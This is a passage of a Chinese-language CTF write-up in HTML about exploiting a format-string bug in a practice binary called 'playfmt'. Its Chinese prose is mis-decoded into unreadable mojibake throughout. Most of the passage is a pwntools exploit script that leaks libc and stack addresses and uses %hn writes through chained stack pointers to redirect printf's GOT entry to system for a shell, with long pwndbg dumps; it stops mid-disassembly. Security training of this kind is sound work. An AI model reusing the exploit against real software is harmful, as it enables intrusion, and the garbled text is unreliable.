src="https://i.loli.net/2018/10/31/5bd9ab6a202f0.png" alt=""></p><p>ÁöÑÁ°ÆÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊºèÊ¥ûÔºåÂæàÊòéÊòæÂíØ„ÄÇ</p><p><img src="https://i.loli.net/2018/10/31/5bd9accfc0a7b.png" alt=""></p><p>Áî®gdbË∞ÉËØïÔºåÂπ∂‰∏îËæìÂÖ•4‰∏™aÔºåÂèØ‰ª•ÁúãÂà∞buf‰∏çÂú®Ê†à‰∏ä„ÄÇ</p><blockquote><p> ÂºïÁî®Â§ß‰Ω¨ÁöÑËØùÔºö<code>ÈÄöËøá‰øÆÊîπÊ†à‰∏≠Â≠òÂú®ÁöÑÊåáÈíàÔºåÂ∞ÜÂÖ∂ÊåáÂêëÊ†à‰∏äÁöÑÂèòÈáèÔºåÂèØ‰ª•Èó¥Êé•Âú∞ÂÆûÁé∞ÂÜôgotÔºåËøôÁßçÊñπÂºèÊòØ‰∏ÄÁßçÂ∏∏ËßÅÁöÑÂ•óË∑Ø„ÄÇ</code></p><p> c/c++‰∏≠ÁöÑ<code>%n</code>ÊòØ‰ªÄ‰πàÊÑèÊÄùÂë¢ÔºåÂÆÉÊòØËæìÂÖ•Ê†ºÂºèÂåñÊéßÂà∂Â≠óÁ¨¶ÔºåÂú®ËøôÈ¢ò‰∏≠ÂèØ‰ª•Áî®‰∫é‰øÆÊîπÊ†à‰∏≠ÂèòÈáèÁöÑÂÄº„ÄÇ</p></blockquote><p>Êàë‰ª¨ÂèØ‰ª•Âú®printfÂáΩÊï∞Â§Ñ‰∏ãÊñ≠ÁÇπÔºåÊü•ÁúãÊ†à‰∏≠ÂèòÈáèÊÉÖÂÜµÔºö</p><p><img src="https://i.loli.net/2018/10/31/5bd9b9c7dc455.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÂèØ‰ª•ÁúãÂà∞ÂÅèÁßªÈáè‰∏∫6ÁöÑÂú∞ÊñπÊòØebpÔºåËÄåebpÊåáÂêë‰∫ÜÂè¶Â§ñ‰∏Ä‰∏™Âú∞ÂùÄÔºåÂç≥ÂÅèÁßªÈáè‰∏∫10ÁöÑÂú∞ÊñπÔºåÁÑ∂ÂêéÂèàÊåáÂêëÂÅèÁßªÈáè‰∏∫15ÁöÑ‰ΩçÁΩÆ„ÄÇËøôÈáåÊàë‰ª¨ÂÖ∂ÂÆûÂèØ‰ª•Ëµ∞‰∏ÄÊ≠•Êç∑ÂæÑÔºåÈÄöËøáËé∑ÂæóÂÅèÁßªÈáè‰∏∫8ÁöÑÂú∞ÊñπËøô‰∏™ÂáΩÊï∞Âú∞ÂùÄÔºåleakÂá∫libcÂü∫Âú∞ÂùÄ„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Ê≠£ÊòØÂõ†‰∏∫Á®ãÂ∫èÊòØÂæ™ÁéØËøêË°åÔºåÊâÄ‰ª•Áªô‰∫ÜÊàë‰ª¨Ë∂≥Â§üÂ§öÊ¨°Êï∞Êù•Èó¥Êé•Ë¶ÜÂÜôGOTË°®„ÄÇ</p><blockquote><p> Ëß£È¢òÈÄªËæëÔºà<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">Êù•Ëá™23r3f</a> ÔºâÔºö</p><pre class=" language-python"><code class="language-python"> ebp_1 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfÂáΩÊï∞Ê†à‰∏≠ÂÅèÁßªÈáè‰∏∫<span class="token number">6</span><span class="token punctuation">,</span> Âç≥$ebp ebp_2 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfÂáΩÊï∞Ê†à‰∏≠ÂÅèÁßªÈáè‰∏∫<span class="token number">10</span><span class="token punctuation">,</span> Âç≥$ebpÁöÑÂÄºÂú∞ÂùÄ fmt_7 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfÂáΩÊï∞Ê†à‰∏≠ÂÅèÁßªÈáè‰∏∫<span class="token number">7</span> fmt_11 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfÂáΩÊï∞Ê†à‰∏≠ÂÅèÁßªÈáè‰∏∫<span class="token number">11</span></code></pre><p> &nbsp; &nbsp; &nbsp; &nbsp; ebp1ÁöÑÂÜÖÂÆπÊòØÊåáÂêëebp2ÁöÑÂú∞ÂùÄÁöÑÊåáÈíàÔºåËÄåebp2ÁöÑÂÜÖÂÆπÂèàÊòØÊåáÂêëÂÖ∂‰ªñÂú∞ÂùÄÁöÑÊåáÈíàÔºåÂõ†Ê≠§Â¶ÇÊûúÊàë‰ª¨Áî®%nÂØπebp1ËøõË°åÊìç‰ΩúÔºåÈÇ£‰πàÂÆûÈôÖ‰∏ä‰ºö‰øÆÊîπebp2ÁöÑÂÄºÔºåÂ¶ÇÊûúÊ≠§Êó∂ÂÜçÊääebp2ÁöÑÂÜÖÂÆπÊîπÊàê‰∏Ä‰∏™ÊåáÂêëfmt7ÁöÑÊåáÈíàÔºåÁÑ∂ÂêéÂú®ÂØπebp2ËøõË°å%nÊìç‰ΩúÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•ÊîπÂèòfmt7ÁöÑÂÜÖÂÆπÔºå‰ªéËÄåÂÆûÁé∞‰∫ÜÈó¥Êé•‰øÆÊîπÊüê‰∏™Âú∞ÂùÄÁöÑÂÜÖÂÆπÔºåËØïÊÉ≥‰∏Ä‰∏ãÔºåÊàë‰ª¨Êääfmt7ÁöÑÂÜÖÂÆπÂèàÊîπÊàêprintfÁöÑgotË°®Âú∞ÂùÄÔºåÈÇ£‰πàfmt7Â∞±ÊåáÂêë‰∫Üprintf_gotÁöÑÂú∞ÂùÄÔºåÂ¶ÇÊûúÁî®%sÊìç‰ΩúÔºåÂ∞±ÂèØ‰ª•Êääprintf_gotÁöÑÂÜÖÂÆπÊâìÂç∞Âá∫Êù•Ôºå‰ªéËÄåÂæóÂà∞‰∫ÜprintfÂáΩÊï∞ÁöÑÁúüÊ≠£Âú∞ÂùÄÔºåÂà∞‰∫ÜËøôÈáåÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáprintfÂáΩÊï∞Ê≥ÑÊºèÂá∫systemÁöÑÁúüÊ≠£Âú∞ÂùÄ‰∫Ü„ÄÇ</p><p> ÂÖ∑‰ΩìÊÄùË∑ØÔºö</p><pre class=" language-python"><code class="language-python"> <span class="token number">1</span><span class="token punctuation">.</span>ÈÄöËøáebp_1‰Ωøebp_2ÊåáÂêëfmt_7 <span class="token number">2</span><span class="token punctuation">.</span>ÈÄöËøáebp_2Â∞Üfmt_7Â§ÑÁöÑÂÜÖÂÆπË¶ÜÁõñÊàêprintf_got <span class="token number">3</span><span class="token punctuation">.</span>ÈÄöËøáebp_1‰Ωøebp_2ÊåáÂêëfmt_11 <span class="token number">4</span><span class="token punctuation">.</span>ÈÄöËøáebp_2Â∞Üfmt_11Â§ÑÁöÑÂÜÖÂÆπ‰øÆÊîπÊàêprintf_got<span class="token operator">+</span><span class="token number">2</span> <span class="token number">5</span><span class="token punctuation">.</span>ÈÄöËøáfmt_7Â∞Üprintf_gotÂú∞ÂùÄÊ≥ÑÈú≤Âá∫Êù• <span class="token number">6</span><span class="token punctuation">.</span>ËÆ°ÁÆóÂá∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ <span class="token punctuation">,</span>Â∞ÜsystemÂáΩÊï∞Âú∞ÂùÄÂÜôÂÖ•printfÂú®gotË°®ÁöÑÂú∞ÂùÄ ÂÖ∑‰ΩìÂÅöÊ≥ïÊòØÂ∞Ü systemÂáΩÊï∞Âú∞ÂùÄÁöÑÂâç‰∏§‰∏™Â≠óËäÇÂÜôÂÖ•fmt_7<span class="token punctuation">,</span>Âêé‰∏§‰∏™Â≠óËäÇÂÜôÂÖ• fmt_11 <span class="token number">7</span><span class="token punctuation">.</span>ÊâßË°åprintfÂáΩÊï∞Áõ∏ÂΩì‰∫éÊâßË°åsystemÂáΩÊï∞ <span class="token number">8</span><span class="token punctuation">.</span>ËæìÂÖ•<span class="token string">"/bin/sh"</span>Â≠óÁ¨¶‰∏≤ÔºåËÆ©systemÂáΩÊï∞‰ªéÊ†à‰∏≠ÂèñÂèÇÊï∞getshell</code></pre></blockquote><p>Êé•‰∏ãÊù•Áõ¥Êé•ÈÄöËøáÁêÜËß£ÂêÑ‰ΩçÂ§ß‰Ω¨expÁöÑÊñπÂºèÔºåÊù•Ê∑±ÂÖ•ÁêÜËß£Ëøô‰∏ÄÈÅìÈ¢òÔºàÂ§™Ëèú‰∫ÜÊàëÔºâ„ÄÇ</p><h3 id="ÊûÑÈÄ†EXP"><a href="#ÊûÑÈÄ†EXP" class="headerlink" title="ÊûÑÈÄ†EXP"></a>ÊûÑÈÄ†EXP</h3><p>‰∏â‰ªΩÂ§ß‰Ω¨EXPÂêÑÊúâ‰∏çÂêåÊäÄÂ∑ßÔºöÂàÜÂà´Êù•Ëá™M4xÔºå23r3fÔºåveritas501</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>__Auther__ <span class="token operator">=</span> <span class="token string">'M4x'</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Breakpoint *do_fmt+64pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "..%8$p....%6$p."...0x804a06f &lt;buf+15>:    ".11111111"0x804a079 &lt;buf+25>:    ""pwndbg> stack 2500:0000‚îÇ esp  0xffa077c0 ‚Äî‚ñ∏ 0x804a060 (buf) ‚óÇ‚Äî 0x38252e2e ('..%8')01:0004‚îÇ      0xffa077c4 ‚Äî‚ñ∏ 0x8048640 ‚óÇ‚Äî jno    0x80486b7 /* 'quit' */02:0008‚îÇ      0xffa077c8 ‚óÇ‚Äî 0x403:000c‚îÇ      0xffa077cc ‚Äî‚ñ∏ 0x804857c (play+51) ‚óÇ‚Äî add    esp, 0x1004:0010‚îÇ      0xffa077d0 ‚Äî‚ñ∏ 0x8048645 ‚óÇ‚Äî cmp    eax, 0x3d3d3d3d05:0014‚îÇ      0xffa077d4 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db006:0018‚îÇ ebp  0xffa077d8 ‚Äî‚ñ∏ 0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x007:001c‚îÇ      0xffa077dc ‚Äî‚ñ∏ 0x8048584 (play+59) ‚óÇ‚Äî nop08:0020‚îÇ      0xffa077e0 ‚Äî‚ñ∏ 0xf7eb0d60 (_IO_2_1_stdout_) ‚óÇ‚Äî 0xfbad288709:0024‚îÇ      0xffa077e4 ‚óÇ‚Äî 0x00a:0028‚îÇ      0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x00b:002c‚îÇ      0xffa077ec ‚Äî‚ñ∏ 0x80485b1 (main+42) ‚óÇ‚Äî nop0c:0030‚îÇ      0xffa077f0 ‚Äî‚ñ∏ 0xf7eb03dc (__exit_funcs) ‚Äî‚ñ∏ 0xf7eb11e0 (initial) ‚óÇ‚Äî 0x00d:0034‚îÇ      0xffa077f4 ‚Äî‚ñ∏ 0xffa07810 ‚óÇ‚Äî 0x10e:0038‚îÇ      0xffa077f8 ‚óÇ‚Äî 0x00f:003c‚îÇ      0xffa077fc ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1010:0040‚îÇ      0xffa07800 ‚óÇ‚Äî 0x111:0044‚îÇ      0xffa07804 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db012:0048‚îÇ      0xffa07808 ‚óÇ‚Äî 0x013:004c‚îÇ      0xffa0780c ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1014:0050‚îÇ      0xffa07810 ‚óÇ‚Äî 0x115:0054‚îÇ      0xffa07814 ‚Äî‚ñ∏ 0xffa078a4 ‚Äî‚ñ∏ 0xffa083d6 ‚óÇ‚Äî './playfmt'16:0058‚îÇ      0xffa07818 ‚Äî‚ñ∏ 0xffa078ac ‚Äî‚ñ∏ 0xffa083e0 ‚óÇ‚Äî 'NO_AT_BRIDGE=1'17:005c‚îÇ      0xffa0781c ‚óÇ‚Äî 0x0... ‚Üì'''</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *do_fmt+64\nc"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"..%8$p....%6$p..11111111\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc.address -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x28</span>success<span class="token punctuation">(</span><span class="token string">"stack -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%30684c%21$hn%1"...0x804a06f &lt;buf+15>:    "6c%22$hn2222222"...0x804a07e &lt;buf+30>:    "2"pwndbg> stack 2500:0000‚îÇ esp  0xffa077c0 ‚Äî‚ñ∏ 0x804a060 (buf) ‚óÇ‚Äî 0x36303325 ('%306')01:0004‚îÇ      0xffa077c4 ‚Äî‚ñ∏ 0x8048640 ‚óÇ‚Äî jno    0x80486b7 /* 'quit' */02:0008‚îÇ      0xffa077c8 ‚óÇ‚Äî 0x403:000c‚îÇ      0xffa077cc ‚Äî‚ñ∏ 0x804857c (play+51) ‚óÇ‚Äî add    esp, 0x1004:0010‚îÇ      0xffa077d0 ‚Äî‚ñ∏ 0x8048645 ‚óÇ‚Äî cmp    eax, 0x3d3d3d3d05:0014‚îÇ      0xffa077d4 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db006:0018‚îÇ ebp  0xffa077d8 ‚Äî‚ñ∏ 0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x007:001c‚îÇ      0xffa077dc ‚Äî‚ñ∏ 0x8048584 (play+59) ‚óÇ‚Äî nop08:0020‚îÇ      0xffa077e0 ‚Äî‚ñ∏ 0xf7eb0d60 (_IO_2_1_stdout_) ‚óÇ‚Äî 0xfbad288709:0024‚îÇ      0xffa077e4 ‚óÇ‚Äî 0x00a:0028‚îÇ      0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x00b:002c‚îÇ      0xffa077ec ‚Äî‚ñ∏ 0x80485b1 (main+42) ‚óÇ‚Äî nop0c:0030‚îÇ      0xffa077f0 ‚Äî‚ñ∏ 0xf7eb03dc (__exit_funcs) ‚Äî‚ñ∏ 0xf7eb11e0 (initial) ‚óÇ‚Äî 0x00d:0034‚îÇ      0xffa077f4 ‚Äî‚ñ∏ 0xffa07810 ‚óÇ‚Äî 0x10e:0038‚îÇ      0xffa077f8 ‚óÇ‚Äî 0x00f:003c‚îÇ      0xffa077fc ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1010:0040‚îÇ      0xffa07800 ‚óÇ‚Äî 0x111:0044‚îÇ      0xffa07804 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db012:0048‚îÇ      0xffa07808 ‚óÇ‚Äî 0x013:004c‚îÇ      0xffa0780c ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1014:0050‚îÇ      0xffa07810 ‚óÇ‚Äî 0x115:0054‚îÇ      0xffa07814 ‚Äî‚ñ∏ 0xffa078a4 ‚Äî‚ñ∏ 0xffa083d6 ‚óÇ‚Äî './playfmt'16:0058‚îÇ      0xffa07818 ‚Äî‚ñ∏ 0xffa078ac ‚Äî‚ñ∏ 0xffa083e0 ‚óÇ‚Äî 'NO_AT_BRIDGE=1'17:005c‚îÇ      0xffa0781c ‚óÇ‚Äî 0x0... ‚Üì'''</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'22222222\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"11111111"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%40976c%57$hn%2"...0x804a06f &lt;buf+15>:    "c%59$hn33333333"0x804a07e &lt;buf+30>:    ""pwndbg> stack 2500:0000‚îÇ esp  0xffa077c0 ‚Äî‚ñ∏ 0x804a060 (buf) ‚óÇ‚Äî 0x39303425 ('%409')01:0004‚îÇ      0xffa077c4 ‚Äî‚ñ∏ 0x8048640 ‚óÇ‚Äî jno    0x80486b7 /* 'quit' */02:0008‚îÇ      0xffa077c8 ‚óÇ‚Äî 0x403:000c‚îÇ      0xffa077cc ‚Äî‚ñ∏ 0x804857c (play+51) ‚óÇ‚Äî add    esp, 0x1004:0010‚îÇ      0xffa077d0 ‚Äî‚ñ∏ 0x8048645 ‚óÇ‚Äî cmp    eax, 0x3d3d3d3d05:0014‚îÇ      0xffa077d4 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db006:0018‚îÇ ebp  0xffa077d8 ‚Äî‚ñ∏ 0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x007:001c‚îÇ      0xffa077dc ‚Äî‚ñ∏ 0x8048584 (play+59) ‚óÇ‚Äî nop08:0020‚îÇ      0xffa077e0 ‚Äî‚ñ∏ 0xf7eb0d60 (_IO_2_1_stdout_) ‚óÇ‚Äî 0xfbad288709:0024‚îÇ      0xffa077e4 ‚óÇ‚Äî 0x00a:0028‚îÇ      0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x00b:002c‚îÇ      0xffa077ec ‚Äî‚ñ∏ 0x80485b1 (main+42) ‚óÇ‚Äî nop0c:0030‚îÇ      0xffa077f0 ‚Äî‚ñ∏ 0xf7eb03dc (__exit_funcs) ‚Äî‚ñ∏ 0xf7eb11e0 (initial) ‚óÇ‚Äî 0x00d:0034‚îÇ      0xffa077f4 ‚Äî‚ñ∏ 0xffa07810 ‚óÇ‚Äî 0x10e:0038‚îÇ      0xffa077f8 ‚óÇ‚Äî 0x00f:003c‚îÇ      0xffa077fc ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1010:0040‚îÇ      0xffa07800 ‚óÇ‚Äî 0x111:0044‚îÇ      0xffa07804 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db012:0048‚îÇ      0xffa07808 ‚óÇ‚Äî 0x013:004c‚îÇ      0xffa0780c ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1014:0050‚îÇ      0xffa07810 ‚óÇ‚Äî 0x115:0054‚îÇ      0xffa07814 ‚Äî‚ñ∏ 0xffa078a4 ‚Äî‚ñ∏ 0xffa077dc ‚Äî‚ñ∏ 0x8048584 (play+59) ‚óÇ‚Äî nop16:0058‚îÇ      0xffa07818 ‚Äî‚ñ∏ 0xffa078ac ‚Äî‚ñ∏ 0xffa077ec ‚Äî‚ñ∏ 0x80485b1 (main+42) ‚óÇ‚Äî nop17:005c‚îÇ      0xffa0781c ‚óÇ‚Äî 0x0... ‚Üì'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((elf.got['printf'] &amp; 0xffff + 2) - (elf.got['printf'] &amp; 0xffff), 0x3b)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"33333333\0"</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"22222222"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%211c%11$hhn%31"...0x804a06f &lt;buf+15>:    "325c%7$hn444444"...0x804a07e &lt;buf+30>:    "44"pwndbg> stack 2500:0000‚îÇ esp  0xffa077c0 ‚Äî‚ñ∏ 0x804a060 (buf) ‚óÇ‚Äî 0x31313225 ('%211')01:0004‚îÇ      0xffa077c4 ‚Äî‚ñ∏ 0x8048640 ‚óÇ‚Äî jno    0x80486b7 /* 'quit' */02:0008‚îÇ      0xffa077c8 ‚óÇ‚Äî 0x403:000c‚îÇ      0xffa077cc ‚Äî‚ñ∏ 0x804857c (play+51) ‚óÇ‚Äî add    esp, 0x1004:0010‚îÇ      0xffa077d0 ‚Äî‚ñ∏ 0x8048645 ‚óÇ‚Äî cmp    eax, 0x3d3d3d3d05:0014‚îÇ      0xffa077d4 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db006:0018‚îÇ ebp  0xffa077d8 ‚Äî‚ñ∏ 0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x007:001c‚îÇ      0xffa077dc ‚Äî‚ñ∏ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ‚Äî‚ñ∏ 0xf7d46930 (printf) ‚óÇ‚Äî call   0xf7e1dae908:0020‚îÇ      0xffa077e0 ‚Äî‚ñ∏ 0xf7eb0d60 (_IO_2_1_stdout_) ‚óÇ‚Äî 0xfbad288709:0024‚îÇ      0xffa077e4 ‚óÇ‚Äî 0x00a:0028‚îÇ      0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x00b:002c‚îÇ      0xffa077ec ‚Äî‚ñ∏ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ‚óÇ‚Äî 0xc870f7d40c:0030‚îÇ      0xffa077f0 ‚Äî‚ñ∏ 0xf7eb03dc (__exit_funcs) ‚Äî‚ñ∏ 0xf7eb11e0 (initial) ‚óÇ‚Äî 0x00d:0034‚îÇ      0xffa077f4 ‚Äî‚ñ∏ 0xffa07810 ‚óÇ‚Äî 0x10e:0038‚îÇ      0xffa077f8 ‚óÇ‚Äî 0x00f:003c‚îÇ      0xffa077fc ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1010:0040‚îÇ      0xffa07800 ‚óÇ‚Äî 0x111:0044‚îÇ      0xffa07804 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db012:0048‚îÇ      0xffa07808 ‚óÇ‚Äî 0x013:004c‚îÇ      0xffa0780c ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1014:0050‚îÇ      0xffa07810 ‚óÇ‚Äî 0x115:0054‚îÇ      0xffa07814 ‚Äî‚ñ∏ 0xffa078a4 ‚Äî‚ñ∏ 0xffa077dc ‚Äî‚ñ∏ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ‚óÇ‚Äî 0xf7d4693016:0058‚îÇ      0xffa07818 ‚Äî‚ñ∏ 0xffa078ac ‚Äî‚ñ∏ 0xffa077ec ‚Äî‚ñ∏ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ‚óÇ‚Äî 0xc870f7d417:005c‚îÇ      0xffa0781c ‚óÇ‚Äî 0x0... ‚Üìpwndbg> n0x08048540 in do_fmt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ REGISTERS ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ EAX  0x7b38 EBX  0x0 ECX  0xffa052a0 ‚óÇ‚Äî 0x20202020 ('    ') EDX  0xf7eb1870 (_IO_stdfile_1_lock) ‚óÇ‚Äî 0x0 EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db0 ESI  0x1 EBP  0xffa077d8 ‚Äî‚ñ∏ 0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x0 ESP  0xffa077c0 ‚Äî‚ñ∏ 0x804a060 (buf) ‚óÇ‚Äî 0x31313225 ('%211') EIP  0x8048540 (do_fmt+69) ‚óÇ‚Äî add    esp, 0x10‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ DISASM ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   0x804853b &lt;do_fmt+64>    call   printf@plt &lt;0x80483a0> ‚ñ∫ 0x8048540 &lt;do_fmt+69>    add    esp, 0x10   0x8048543 &lt;do_fmt+72>    jmp    do_fmt+6 &lt;0x8048501>    